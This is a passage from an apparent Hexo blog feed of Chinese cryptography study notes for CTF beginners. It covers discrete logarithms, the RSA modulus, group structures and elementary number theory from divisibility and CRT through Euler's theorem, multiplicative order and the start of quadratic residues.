logarithm)"></a>离散对数(discrete logarithm)</h2><p>$n=1,2,4,p^e,2p^e$时，存在原根 (设为$g),Z_n^*$是循环群</p><p><strong>定义</strong>：$gcd(a,n)=1$,必存在<strong>唯一整数</strong>$x(0\leq x&lt;\phi(n))$<br>有 $a\equiv g^{x}\pmod n$,则称$x$是以$g$为底的$a$模$n$的<strong>指标</strong><br>(index)或<strong>离散对数(discrete logarithm)</strong>。</p><p>简记为：$x=log_g(a)$</p><script type="math/tex; mode=display">1\equiv g^0(modn)\Longrightarrow log_g(1)=0\\g\equiv g^1(modn)\Longrightarrow log_g(g)=1</script><p><strong>定理</strong>：$a\equiv g^r\pmod n\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}\text{设 }x=log_g(a), &\text{则 }a\equiv g^x(\mathrm{mod~}n) \\a\equiv g^r (mod n) &\Leftrightarrow g^x\equiv g^r\mathrm{~}(mod\mathrm{~}n) \\&\Leftrightarrow x\equiv r\pmod{\phi(n)} \\&\Leftrightarrow log_g(a)\equiv r\pmod{\phi(n)}\end{aligned}</script></blockquote><p><strong>性质1</strong>:$log_g(ab)\equiv log_g(a)+log_g(b)\pmod {\phi(n)}$</p><p><strong>性质2</strong>:$log_g(a^m)\equiv m\times log_g(a)\pmod {\phi(n)}$</p><p><strong>性质3</strong>:$log_h(a)\equiv log_h(g)\times log_g(a)\pmod {\phi(n)}$</p><h3 id="离散对数问题-DLP-discrete-logarithm-problem"><a href="#离散对数问题-DLP-discrete-logarithm-problem" class="headerlink" title="离散对数问题(DLP,discrete logarithm problem)"></a>离散对数问题(DLP,discrete logarithm problem)</h3><p><strong>定义</strong>：设$G$是循环群，$g\in G$是生成元，对于$y\in G$和正<br>整数$x$,有 $y=g^x$,则离散对数问题定义为：<br>给定$y$和$g$,求$x (=log_g(y))$。</p><p>目前无高效算法</p><hr><h2 id="RSA的模数"><a href="#RSA的模数" class="headerlink" title="RSA的模数"></a>RSA的模数</h2><p>RSA的所有计算都是在$\mathbb{Z}_n^*$上进行的</p><p>$n=pq$</p><p>$\phi(n)=\phi(pq)=\phi(p)\phi(q)=(p-1)(q-1)$</p><p>$\forall a\in \mathbb{Z}_n^*,ord_n(a)\mid (p-1)(q-1)$</p><p>$设\lambda(n)=lcm(p-1,q-1)&lt;(p-1)(q-1)$</p><p>$\mathbb{Z}_n^*没有原根（生成元），不是循环群$</p><p><strong>定理</strong>：<script type="math/tex">\mathbb{Z}_n^*中任意元素的阶都是\lambda(n)的因子</script></p><script type="math/tex; mode=display">\mathbb{Z}_n^*$$中没有原根(生成元)，不是循环群$$Z_p^*$$和$$Z_q^*$$都是循环群 (因为$p$和$q$是素数，满足五种情况之一)$$\mathbb{Z}_p^*$$里元素最大阶为$p-1$$$Z_q^*$$里元素最大阶为$q-1$$$\mathbb{Z}_n^*$$里元素最大阶为$\lambda(n)$**结论**：$$Z_n^*$$的阶是$\phi(n)$,元素最大阶为$\lambda(n)$$$\forall a\in Z_n^*$$,由$ord_p(a)$和$ord_\mathfrak{q}(a)$如下计算$ord_n(a):$$$ord_n(a)=lcm(ord_p(a),ord_q(a))</script><blockquote><p><strong>注意</strong>：有的<script type="math/tex">a\in\mathbb{Z}_n^*</script>,     $a$的阶$ord_n(\boldsymbol{a})=\lambda(\boldsymbol{n})$,但是<br>$ord_p(a)&lt;p-1$和/或$ord_q(a)&lt;q-1$</p></blockquote><hr><h2 id="补充：群的体系"><a href="#补充：群的体系" class="headerlink" title="补充：群的体系"></a>补充：群的体系</h2><p><strong>广群(groupoid)</strong>：<script type="math/tex">(A,*)</script>，仅满足<strong>封闭性</strong></p><p><strong>半群(semigroup)</strong>：<script type="math/tex">(A,*)</script>，满足封闭性，<strong>结合律</strong></p><p><strong>幺半群(monoid,独异点)</strong>：<script type="math/tex">(A,*)</script>，满足封闭性，结合律，有<strong>单位元(幺元)</strong></p><p><strong>群(group)</strong>：<script type="math/tex">(A,*)</script>，满足封闭性，结合律，有单位元(幺元)，每个元素都有<strong>逆元</strong></p><p><strong>阿贝尔群</strong>：<script type="math/tex">(A,*)</script>，满足封闭性，结合律，有单位元(幺元)，每个元素都有逆元，运算还满足<strong>交换律</strong></p><p><strong>循环群</strong>：具有生成元的<strong>阿贝尔群</strong></p><hr><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><p>★,°<em>:.☆(￣▽￣)/$:</em>.°★<em> 。<em>*爱来自😽C.A.T😸喵</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 筑基篇 </tag>
            
            <tag> 抽象代数 </tag>
            
            <tag> 群论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>筑基篇·初等数论</title>
      <link href="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/"/>
      <url>/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学学习笔记——筑基篇·卷一（初等数论）"><a href="#密码学学习笔记——筑基篇·卷一（初等数论）" class="headerlink" title="密码学学习笔记——筑基篇·卷一（初等数论）"></a><strong>密码学学习笔记——筑基篇·卷一（初等数论）</strong></h2><hr><h3 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h3><p>在学习、比赛的过程中，感觉没有数竞基础的同学入坑Crypto真的很痛苦，很多<strong>概念和符号</strong>都不懂。</p><p>所以在此分享自己的数学基础学习笔记(九年制义务教育都能看得懂的那种，建议加入中考😀),因为都是基础知识，就命名为《筑基篇》吧，希望能减轻大家入坑密码的痛感，大家一起快乐的学习吧！！！</p><p>当然，看我这篇笔记肯定是不够的，有些证明过程我也是直接省略了，大家还是要把密码学涉及到的全部知识系统的学习一遍，很重要的一点是<strong>学会动笔！</strong>。</p><p>如果以后我润别的方向了，也算给自己的CTF的Crypto生涯一份结果。</p><p>如果有错误也<strong>恳请大家指正</strong>，爱来自NJUST。</p><p><strong>那么，筑基篇，正式开始!!!!!</strong></p><blockquote><p>PS1：由于各人编辑器的使用习惯差异，符号字母也是markdown公式编辑手搓出来的，发布出来的公式渲染可能会出一点点小问题，大家多包涵，<strong>对于渲染不出来的公式，大家可以自己复制到typora里看</strong>😀。</p><p>PS2：编辑器和我个人水平差的缘故，可能排版、内容顺序杂乱，大家轻点喷</p><p>PS3：有修改建议的话可以发邮件捏email: <strong>Cucumber0703@outlook.com</strong> ,看到后会光速滑轨修改的</p></blockquote><hr><h1 id="初等数论"><a href="#初等数论" class="headerlink" title="初等数论"></a>初等数论</h1><hr><h2 id="整除性（Divisibility）"><a href="#整除性（Divisibility）" class="headerlink" title="整除性（Divisibility）"></a>整除性（Divisibility）</h2><script type="math/tex; mode=display">\begin{flalign*}b|a:&设a,b∈\mathbb{Z}，如果存在一个q∈\mathbb{Z}\\&使得a=qb，则称“b整除a”，记为“\ b|a\ "\\&(或称：b是a的因子，a是b的倍数，a被b整除)\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}b\nmid a：&b不能整除a(a不能被b整除\\&b|a \iff a=qb\\&&\end{flalign*}\\</script><script type="math/tex; mode=display">\begin{flalign*}&对于任意a,b,c∈\mathbb{Z}，有：\\&(1)b|0\\&(2)1|a\\&(3)0|a\iff a=0 (部分教材说明b可为0，由于在定义中为乘法关系a=qb，故虽然a被b整除，b依旧可为0)\\&(4)b|a\iff b|-a \iff -b|a\\&(5)b|a且a|b当且仅当a=±b，特别地，a|1当且仅当a=±1\\&&\end{flalign*}\\</script><ul><li>(自反性)  $a|a$</li><li>(传递性)  $b|a且a|c,则b|c$</li><li>(相乘性)  $b|a，则bc|ac$</li><li>(消去性)  $bc|ac且c≠0，则b|a$</li><li>(线性性)  $b|a且b|c，对于所有s,t∈\mathbb{Z},都有b|(sa±tc)$</li><li>(比较性)  $如果a,b∈\mathbb{N}且b|，则b≤a$</li></ul><blockquote><p>练习题1：</p><p>证明对于任何自然数，让其各位上的数字相加之和如果能被3整除，那么这个自然数也可以被3整除</p></blockquote><hr><h2 id="素数（Prime）"><a href="#素数（Prime）" class="headerlink" title="素数（Prime）"></a>素数（Prime）</h2><ul><li><p>定义：$设n∈\mathbb{N}且n≥2，除了1和n以外，没有其他正整数整除n，n称作“素数”(通常用p表示)；否则，n称作“合数”$</p><blockquote><p>PS：$1既不是素数也不是合数$</p><p>PS：$n为合数，则n=ab，其中1&lt;a&lt;n，1&lt;b&lt;n$</p></blockquote></li></ul><h3 id="引理：任何大于1的整数必有素因子。"><a href="#引理：任何大于1的整数必有素因子。" class="headerlink" title="引理：任何大于1的整数必有素因子。"></a><strong>引理：任何大于1的整数必有素因子。</strong></h3><h3 id="定理：任何合数n都至少有一个不超过-sqrt-n-的素因子（n-gt-1是合数，则存在素数p，使p≤-sqrt-n-）"><a href="#定理：任何合数n都至少有一个不超过-sqrt-n-的素因子（n-gt-1是合数，则存在素数p，使p≤-sqrt-n-）" class="headerlink" title="定理：任何合数n都至少有一个不超过$\sqrt{n}$的素因子（n&gt;1是合数，则存在素数p，使p≤$\sqrt{n}$）"></a><strong>定理：任何合数n都至少有一个不超过$\sqrt{n}$的素因子（n&gt;1是合数，则存在素数p，使p≤$\sqrt{n}$）</strong></h3><ul><li><strong>判断n是否是素数，如果所有素数p≤$\sqrt{n}$都不能整除n，则n是素数</strong></li></ul><h3 id="定理：算数基本定理：任何非零整数n，可以表示成如下的乘积形式："><a href="#定理：算数基本定理：任何非零整数n，可以表示成如下的乘积形式：" class="headerlink" title="定理：算数基本定理：任何非零整数n，可以表示成如下的乘积形式："></a><strong>定理：算数基本定理</strong>：任何非零整数n，可以表示成如下的乘积形式：</h3><script type="math/tex; mode=display">n=\pm p_1^{e_1}\dots p_r^{e_r}</script><p>​        其中，$p_1,\dots ,p_r是互不相同的素数，e_1,\dots，e_r是正整数$。</p><ul><li>PS：这个表示形式唯一（忽略顺序），认为$\pm1$可以表示成0个素因子项相乘（r=0），通常把0个素数相乘的结果作为1。</li></ul><h3 id="定理：-设p是素数，a-b∈-mathbb-Z-则p-mid-ab-Rightarrow-p-mid-a或p-mid-b"><a href="#定理：-设p是素数，a-b∈-mathbb-Z-则p-mid-ab-Rightarrow-p-mid-a或p-mid-b" class="headerlink" title="定理：$设p是素数，a,b∈\mathbb{Z},则p\mid ab \Rightarrow p\mid a或p\mid b$"></a>定理：$设p是素数，a,b∈\mathbb{Z},则p\mid ab \Rightarrow p\mid a或p\mid b$</h3><blockquote><p>推论：$设p是a_1,\dots ,a_k\in \mathbb{Z},则p\in a_1\dots a_k \Rightarrow p \in a_i,i \in {1,\dots,k}$</p></blockquote><h3 id="定理：欧几里得定理：素数有无穷或多个"><a href="#定理：欧几里得定理：素数有无穷或多个" class="headerlink" title="定理：欧几里得定理：素数有无穷或多个"></a><strong>定理：欧几里得定理：素数有无穷或多个</strong></h3><p>​        证明略</p><hr><h2 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h2><script type="math/tex; mode=display">a\ mod\ b：设a，b∈ \mathbb{Z}且b>0,如果q,r∈\mathbb{Z}满足\\a=qb+r,且0\leq r<b,\\则定义：a\ mod\ b=r</script><p>负数怎么求模？</p><blockquote><p> 用b不断加a，直至大于0</p></blockquote><p>性质：</p><ul><li>$b|a \iff a\ mod\ b=0$</li><li>$(a+b)\ mod\ n=(a\ mod\ n+b\ mod n)\ mod\ n$</li><li>$(a-b)\ mod\ n=(a\ mod\ n-b\ mod n)\ mod\ n$</li><li>$(a\times b)\ mod\ n=(a\ mod\ n\times b\ mod n)\ mod\ n$</li></ul><h3 id="乘法逆元（一定要说明是在哪个模数下的乘法逆元）"><a href="#乘法逆元（一定要说明是在哪个模数下的乘法逆元）" class="headerlink" title="乘法逆元（一定要说明是在哪个模数下的乘法逆元）"></a>乘法逆元（一定要说明是在哪个模数下的乘法逆元）</h3><blockquote><p>九年制义务教育中的概念：倒数：两个数的乘积为1，就称这两个数互为倒数</p></blockquote><p>定义：$设a\in \mathbb{Z},n\in \mathbb{N},如果 az \equiv1 \pmod n,$<br>$称z是模n下a的乘法逆元，记作a^{-1}=z。$</p><blockquote><p>例：</p><p>$2^{-1}\ mod\ 7=4$</p><p>$2^{-1}\ mod\ 5=3$</p></blockquote><ul><li><p>注意1：$模n下互为乘法逆元，一般只考虑比n小的$</p></li><li><p>注意2：$a在模n内的乘法逆元a^{-1}(1\le a^{-1} \lt n)是唯一的$</p></li><li><p>注意3：乘法逆元存在的条件：</p><p>$gcd(a,n)=1\iff 模n下，a有乘法逆元$</p></li></ul><p>怎么求乘法逆元，见下面——<strong>扩展的欧几里得算法</strong></p><hr><h2 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h2><ul><li>$设a,b∈\mathbb{Z},如果d∈\mathbb{Z}且d|a，d|b，则称d是a和b的公因子(公约数)$</li><li>$如果d≥0，且a和b的所有公因子都整除d，则称d是a和b的最大公约数，记作gcd(a,b).$</li></ul><blockquote><p>PS:公因子可以是任意整数（包括0，负整数）</p><p>PS:最大公约数只能是0或正整数，不能是负的</p></blockquote><h3 id="欧几里得算法-辗转相除法"><a href="#欧几里得算法-辗转相除法" class="headerlink" title="欧几里得算法 (辗转相除法)"></a>欧几里得算法 (辗转相除法)</h3><p> 不失一般性，设a≥b≥0，求gcd(a,b)</p><p>数学原理：</p><p>$b=0时，gcd(a,0)=a$（任何整数都是0的公因子）</p><script type="math/tex; mode=display">b>0时，gcd(a,b)=gcd(b,r)=gcd(r,r_1)\\=gcd(r_n,0)=r_n</script><blockquote><p>PS：r为余数，a=qb+r</p></blockquote><h3 id="扩展的欧几里得算法-广义欧几里得算法"><a href="#扩展的欧几里得算法-广义欧几里得算法" class="headerlink" title="扩展的欧几里得算法(广义欧几里得算法)"></a>扩展的欧几里得算法(广义欧几里得算法)</h3><p>用途：$计算as+bt=gcd(a,b)中的s和t$</p><p>本质是在执行欧几里得算法的时候利用每一步计算出来的余数以及副产品“商”，顺道迭代的计算出每一步对应的s和t</p><p><img src="/2024/07/30/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/exgcd.jpg" alt="exgcd"></p><h3 id="裴蜀定理"><a href="#裴蜀定理" class="headerlink" title="裴蜀定理"></a>裴蜀定理</h3><p>$若a,b是整数,且    gcd    (a,b)=d，那么对于任意的整数x,y,ax+by都一定是d的倍数，特别地，一定存在整数x,y，使ax+by=d成立$</p><p>注意：此处的x和y是整数（即可以是负数）</p><h3 id="定理：最大公约数表示定理"><a href="#定理：最大公约数表示定理" class="headerlink" title="定理：最大公约数表示定理"></a>定理：最大公约数表示定理</h3><p>$设a,b∈\mathbb{Z},d=gcd(a,b),则\exist s,t∈\mathbb{Z},使得as+bt=d$</p><p>特别地：$gcd(a,b)=1\iff as+bt=1$</p><p>推论：$d\mid v\iff as+bt=v$</p><h3 id="求乘法逆元"><a href="#求乘法逆元" class="headerlink" title="求乘法逆元"></a>求乘法逆元</h3><p>$设gcd(a,n)=1$</p><p>$根据最大公约数表示定理，有$</p><p>$as+tn=1$</p><p>$等式两边同时模n，得$</p><p>$as\equiv1\pmod n$</p><p>$易知，模n下a的逆元是s$</p><hr><h2 id="互素"><a href="#互素" class="headerlink" title="互素"></a>互素</h2><ul><li><p>$设a,b∈\mathbb{Z},如果gcd(a,b)=1,则称a和b互素。$</p></li><li><p>$设gcd(a,b)=d,则存在q_1,q_2\in \mathbb{Z},使得a=q_1 d,b=q_2d,且gcd(q_1,q_2)=1$</p></li></ul><hr><h2 id="最小公倍数-LCM"><a href="#最小公倍数-LCM" class="headerlink" title="最小公倍数(LCM)"></a>最小公倍数(LCM)</h2><ul><li><p>$设a,b∈\mathbb{Z},如果m∈\mathbb{Z}分别是a和b的倍数，m称作a和b的公倍数$</p><blockquote><p>$如果a\mid c,b\mid c,则m\mid c$</p></blockquote></li><li><p>$lcm(a,b):a和b的最小公倍数$</p></li><li>$a,b≠0：m是a和b所有正的公倍数中最小，m叫作a和b的最小公倍数$</li><li>$a=0或b=0：lcm(a,b)=0$</li><li><p>$gad(a,b)=1\Rightarrow lcm(a,b)=ab$</p></li><li><p>$lcm(a,b)=ab/gcd(a,b)$</p><blockquote><p>求lcm：两个数不断加自己，直至相等。</p></blockquote></li></ul><hr><h2 id="等价关系"><a href="#等价关系" class="headerlink" title="等价关系"></a>等价关系</h2><p>同时满足<strong>自反性，对称性，传递性</strong></p><blockquote><p>例：&gt;只满足传递性，≥不满足对称</p></blockquote><h2 id="同余关系"><a href="#同余关系" class="headerlink" title="同余关系"></a>同余关系</h2><p>$a\equiv b \pmod n$：设n为正整数(此处被称为模数)，整数a和b分别模n，如果得到相同的余数，就称a和b在模n下满足同余关系，简称同余（此处为关系，而非运算，与$a\  mod \ b$进行区分）</p><p>定义：$设a,b,n∈\mathbb{Z},n\mid (a-b),就称a和b在模n下同余，记作a\equiv b\pmod n。$</p><p>是一种<strong>等价关系</strong></p><p>运算性质：加减乘(甚至是和乘方)仍然满足同余关系，除法有需要特别注意的地方。</p><h3 id="一次同余方程"><a href="#一次同余方程" class="headerlink" title="一次同余方程"></a>一次同余方程</h3><p>$x\equiv b \pmod n的解集：{b\pm nk,其中k=0,1,2,3\dots}$</p><ul><li><p>一个规律：$原模数为n,最终模数为n^{’},设n/n{’}=d，有0\sim n-1之间解的数量恰好等于d$</p></li><li><p>有解的条件：$若gcd(a,n)=d,则ax\equiv b\pmod n有解\iff d\mid b$</p></li></ul><h3 id="消去律"><a href="#消去律" class="headerlink" title="消去律"></a>消去律</h3><p>$定义：设a,n\in \mathbb{Z},n&gt;0,如果gcd(a,n)=d,有$</p><p>$az\equiv az^{‘}\pmod n\ \Rightarrow \ z\equiv z^{‘}\pmod {n/d}$</p><hr><h2 id="剩余类-一种等价类"><a href="#剩余类-一种等价类" class="headerlink" title="剩余类(一种等价类)"></a>剩余类(一种等价类)</h2><h3 id="等价类的概念"><a href="#等价类的概念" class="headerlink" title="等价类的概念"></a>等价类的概念</h3><p>$设\sim是集合S上的等价关系，对于a\in \mathbb{S},定义其等价类为{x\in \mathbb{S}\ |\ x\sim a}$</p><ul><li>$\mathbb{S}中每个元素必存在于唯一的等价类中$</li><li>$所有等价类的并集恰好就是\mathbb{S}$</li></ul><h3 id="剩余类-满足等价类所有性质"><a href="#剩余类-满足等价类所有性质" class="headerlink" title="剩余类(满足等价类所有性质)"></a>剩余类(满足等价类所有性质)</h3><p>$设a\in \mathbb{Z}，定义其剩余类为{x\in \mathbb{Z}\ |\ x\equiv a\pmod n \ }$</p><p>$模n下含整数a的剩余类，记作[a]_n,不引起歧义时，简记为[a]$</p><p>$剩余类里的每个整数都叫作这个剩余类的代表元，比如模5下,-10,-5,0,5,10都是[0]的代表元$</p><h3 id="剩余类集：-mathbb-Z-n"><a href="#剩余类集：-mathbb-Z-n" class="headerlink" title="剩余类集：$\mathbb{Z_n}$"></a>剩余类集：$\mathbb{Z_n}$</h3><p>$\mathbb{Z_n}={[0],[1],[2]\dots\,[n-1]}$</p><p>$\mathbb{Z_5}={[0],[1],[2],[3],[4],}$</p><h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><p>$[a]+[b]:=[a+b]$</p><p>$[a]·[b]:=[a·b]$</p><p>$其中a,b\in \mathbb{Z}$</p><p>$设u,v\in \mathbb{Z_n},若uv=[1],则u和v互为乘法逆元$</p><p>$设u=[a],v=[b],则$</p><p>​    $u和v互为乘法逆元\iff ab \equiv1 \pmod n$</p><p>​    $即u(和v)有乘法逆元\iff a(和b)与n互素$</p><p>$\mathbb{Z^{*}_n}={\mathbb{Z_n}中有乘法逆元的剩余类}$</p><p>​       $={[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1}$</p><ul><li><p>$n为素数：\mathbb{Z^{*}_n}=\mathbb{Z_n} \setminus {[0]}$</p></li><li><p>$n为合数：\mathbb{Z^{*}_n} \subsetneq \mathbb{Z_n}\setminus{[0]}$</p></li></ul><p><strong>不引起起义的情况下，[ ]可以省略</strong></p><hr><h2 id="中国剩余定理-孙子定理"><a href="#中国剩余定理-孙子定理" class="headerlink" title="中国剩余定理(孙子定理)"></a>中国剩余定理(孙子定理)</h2><p>$设两两互素的模数n_1,\dots,n_m\in \mathbb{N},以及任意整数a_1,\dots,a_m\in \mathbb{Z},并设n={\prod}\limits_{i=1}^mn_i,方程组$</p><p>​        <script type="math/tex">\left \{  \begin{array}{c} x\equiv a_1\pmod {n_1} \\  \dots \\  x\equiv a_m\pmod {n_m} \end{array} \right.</script></p><p>$必有解，设解为a\in \mathbb{Z}。并且对任意a^{’}\in \mathbb{Z},都有$</p><p>$a^{’}是方程组的解\iff a\equiv a^{‘}\pmod n$</p><p>$设n=\prod_{i=1}^mn_i$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1,\dots,n_i^{*}=n/n_i,\dots,n_m^{*}=n/n_m</script><p>​            <script type="math/tex">gcd(n_1^{*},n_1)=1,\dots,gcd(n_i^{*},n_i)=1,\dots,gcd(n_m^{*}，n_m)=1</script></p><p>​            <script type="math/tex">t_1n_1^{*}\equiv1 \pmod {n_1},\dots,t_in_i^{*}\equiv1 \pmod {n_i},\dots,t_m n_m^{*}\equiv 1 \pmod {n_m}</script></p><p>​            <script type="math/tex">e_i=t_in_i^{*}\equiv\left \{\begin{array}{c}1\pmod {n_i} \\\ 0\pmod {n_j},j\neq i \end{array} \right.</script></p><p>​            $a={\sum}\limits_{i=1}^{m}e_ia_i=e_1a_1+\dots+e_ma_m$</p><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i</script><blockquote><p>例：三三数之剩二，五五数之剩三，七七数之剩二，问物几何？</p><p>自己去搜索《孙子歌诀》，看看老祖宗的智慧</p><p>笔者在此一遍此处的做法</p><script type="math/tex; mode=display">\left \{  \begin{array}{c} x\equiv 2\pmod{3} \\ x\equiv 3\pmod {5}\\  x\equiv 2\pmod {7} \end{array} \right.</script><p>$n=3\times 5\times7=105$</p><script type="math/tex; mode=display">n_1^{*}=n/n_1=35,n_2^{*}=n/n_2=21,n_3^{*}=n/n_3=15</script><script type="math/tex; mode=display">n_1^{*-1}=2，n_2^{*-1}=1，n_3^{*-1}=1，</script><script type="math/tex; mode=display">PS:n_i^{*-1}为n_1^{*}模n_i的乘法逆元</script><script type="math/tex; mode=display">e_1=35*2=70,e_2=21*1=21,e_3=15*1=15</script><script type="math/tex; mode=display">a={\sum}\limits_{i=1}^{m}n_i^{*}n_i^{-1}a_i=233</script><p>$最后，105内的唯一解即为233\ mod\ 105=23$</p></blockquote><h3 id="中国剩余映射"><a href="#中国剩余映射" class="headerlink" title="中国剩余映射"></a>中国剩余映射</h3><p>$设两两互素的模数n_1,\dots,n_m\in \mathbb{N},n={\prod}\limits_{i=1}^mn_i,则中国剩余映射$</p><p>$\tau：\mathbb{Z_n}\rightarrow \mathbb{Z_{n_1}}\times\dots\times \mathbb{Z_{n_m}}$</p><p>​    $a\rightarrow(a\ mod\ n_1,\dots,a\ mod\ n_m)$</p><p>$是一个双射$</p><ul><li>$将所有\mathbb{Z}换成带*的，式子依然成立$</li></ul><hr><h2 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h2><p>孩子们，看到这里，不妨先往前翻几章，看看剩余类中提到的一个概念</p><p>$\mathbb{Z^{*}_n}={\mathbb{Z_n}中有乘法逆元的剩余类}$</p><p>​       $={[a]\ |\ a=0,1,\dots,n-1,gcd(a,n)=1}$</p><ul><li><p>$n为素数：\mathbb{Z^{*}_n}=\mathbb{Z_n}\setminus{[0]}$</p></li><li><p>$n为合数：\mathbb{Z^{*}_n}\subsetneq \mathbb{Z_n}\setminus{[0]}$</p></li></ul><p><strong>不引起歧义的情况下，[ ]可以省略</strong></p><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>$对于所有正整数n\in \mathbb{N},定义欧拉函数$</p><p>$\phi(n)=|\mathbb{Z_n^{*}}|$</p><p>$且令\phi(1)=1$</p><p>$或者说,0 \sim {n-1}之间与n互素的整数有多少个，\phi(n)就等于几$</p><h3 id="三个性质"><a href="#三个性质" class="headerlink" title="三个性质"></a>三个性质</h3><ul><li><p>$性质一：设两两互素的正整数n_1,\dots,n_m\in \mathbb{N},并设n={\prod}\limits_{i=1}^mn_i,$</p><p>$\phi(n)={\prod}\limits_{i=1}^m\phi({n_i})$</p></li><li><p>$性质2：\phi(p^k)=p^{k-1}\phi(p)$</p></li><li>$性质3：\phi(p)=p-1$</li></ul><blockquote><p>例子:</p><script type="math/tex; mode=display">\begin{flalign*}&\phi(30000)\\&=\phi(3*2^4*5^4)\\&=\phi(3)*\phi(2^4)*\phi(5^4)\\&=\phi(3)*2^3\phi(2)*5^3\phi(5^4)\\&=2*2^3*1*5^3*4\\&=8000\\&&\end{flalign*}\\</script></blockquote><hr><h2 id="乘法阶-Multiplicative-Order"><a href="#乘法阶-Multiplicative-Order" class="headerlink" title="乘法阶(Multiplicative Order)"></a>乘法阶(Multiplicative Order)</h2><p>$设a\in \mathbb{Z_n^{*}},使得a^k\equiv1\pmod n的最小正整数k称作a在模n下的乘法阶。用ord_n(a)表示。$</p><script type="math/tex; mode=display">设a\in \mathbb{Z_n^{*}}的(乘法)阶为k，则以下整数能彼此不同\\a^0,a^1,a^2,\dots,a^{k-1}\\所有运算都模n</script><script type="math/tex; mode=display">a^i\equiv a^j\pmod n,其中i>j\\a^i/a^j\equiv a^j/a^j\pmod n\\a^{i-j}\equiv1\pmod n\\a^t\equiv1\pmod n,令t=i-j</script><h3 id="性质："><a href="#性质：" class="headerlink" title="性质："></a>性质：</h3><ul><li>$a^i\equiv1\pmod n\iff k\mid i$</li><li>$a^i\equiv a^j\pmod n\iff i\equiv j \pmod k$</li></ul><blockquote><p>例：设a在模7下的阶为3，则</p><p>$a^{101}\equiv a^{101\ mod\ 3}\equiv a^2(mod\ 7)$</p></blockquote><p><strong>性质1</strong>:<script type="math/tex">\forall m\in \mathbb{Z},有ord_n(a)|m\Leftrightarrow a^m\equiv1\pmod n</script></p><p><strong>性质2</strong>:$a,a^2,a^3,\dots,a^{ord_n(a)}=1各不相同$</p><p><strong>性质3</strong>:$\forall k\in \mathbb{Z},则a^k的乘法阶为ord_n(a)/gcd(k,ord_n(a))$</p><p><strong>性质4</strong>:$ord_n(a)|\phi(n)$，$ord_p(a)|(p-1)$</p><p><strong>性质5</strong>：$d$是$\phi(n)$的正因子，<script type="math/tex">Z_n^*</script>里的$d$阶元素一共有$\phi(d)$个</p><hr><h2 id="欧拉定理-Euler’s-theorem-amp-费马小定理-Fermat’s-little-theorem"><a href="#欧拉定理-Euler’s-theorem-amp-费马小定理-Fermat’s-little-theorem" class="headerlink" title="欧拉定理(Euler’s theorem)&amp;费马小定理(Fermat’s little theorem)"></a>欧拉定理(Euler’s theorem)&amp;费马小定理(Fermat’s little theorem)</h2><p>欧拉定理：<script type="math/tex">设a\in \mathbb{Z_n^{*}},则\\a^{\phi(n)}\equiv1\pmod n</script></p><p>$且k\mid \phi(n),其中k是a在模n下的阶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>两边都乘a</p><p>得到$a^p\equiv a\pmod p$</p><p>即<strong>费马小定理</strong>$(对于任意素数p和整数a\in \mathbb{Z_p},都有a^p\equiv a\pmod p)$</p><blockquote><p>例题：</p><p>求$3^{2022}\ mod\ 8$</p><p>$gcd(3,8)=1,可用欧拉定理$</p><p>$\phi(8)=\phi(2^3)=2^2\phi(2)=4,所以3^4\equiv1\pmod 8$</p><script type="math/tex; mode=display">3^{2022}\ mod\ 8\\=3^{505\times4+2}\ mod\ 8\\=3^2\ mod\ 8\\=1</script></blockquote><h3 id="定理：-设a-in-mathbb-Z-n-m-in-mathbb-Z-a在模n下的乘法阶为k，则a-m在模n下的乘法阶为k-gcd-m-k"><a href="#定理：-设a-in-mathbb-Z-n-m-in-mathbb-Z-a在模n下的乘法阶为k，则a-m在模n下的乘法阶为k-gcd-m-k" class="headerlink" title="定理：$设a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},a在模n下的乘法阶为k，则a^m在模n下的乘法阶为k/gcd(m,k)$"></a>定理：$设a\in \mathbb{Z_n^{*}},m\in \mathbb{Z},a在模n下的乘法阶为k，则a^m在模n下的乘法阶为k/gcd(m,k)$</h3><p>$证明:设a^m的阶为t,则 (a^m)t\equiv1\mathrm{~(mod~n)}$<br>$所以 a^{mt}\equiv 1\pmod n,必有 k|mt $<br>$则有 mt \equiv 0\pmod k$<br>$t\equiv 0\pmod{k/gcd(m,k)}$</p><blockquote><p>例题：</p><p>$设a\in Z_n^{*}的乘法阶是6，求a^9的乘法阶$</p><script type="math/tex; mode=display">解：k=6，m=9，\\gcd(k,m)=3,则\\阶为k/gcd(k,m)=2</script></blockquote><hr><h2 id="二次剩余-Quadratic-residue"><a href="#二次剩余-Quadratic-residue" class="headerlink" title="二次剩余(Quadratic residue)"></a>二次剩余(Quadratic residue)</h2><p>$x^2\equiv a\pmod {n}$</p><script type="math/tex; mode=display">定义：设a\in \mathbb{Z}_n^{*},如果存在整数b\in \mathbb{Z},\\使得b^2\equiv a\pmod 